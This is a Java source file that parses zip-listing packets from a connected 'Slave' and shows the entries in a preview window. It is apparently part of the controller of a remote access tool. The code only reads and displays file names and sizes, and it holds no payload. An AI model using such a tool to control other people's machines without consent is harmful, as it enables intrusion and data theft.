package com.redpois0n.packets;

import javax.swing.Icon;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FramePreviewZip;
import com.redpois0n.utils.IconUtils;


public class PacketZIP extends AbstractPacket {

	@Override
	public void read(Slave slave, String line) throws Exception {
		boolean dir = Boolean.parseBoolean(slave.readLine());
		String name = slave.readLine();
		String filesize = slave.readLine() + " kB";

		FramePreviewZip frame = FramePreviewZip.instances.get(slave);

		if (frame != null) {
			Icon icon = IconUtils.getFileIconFromExtension(name, dir);

			frame.getModel().addRow(new Object[] { icon, name, dir ? "" : filesize });
		}
	}

}
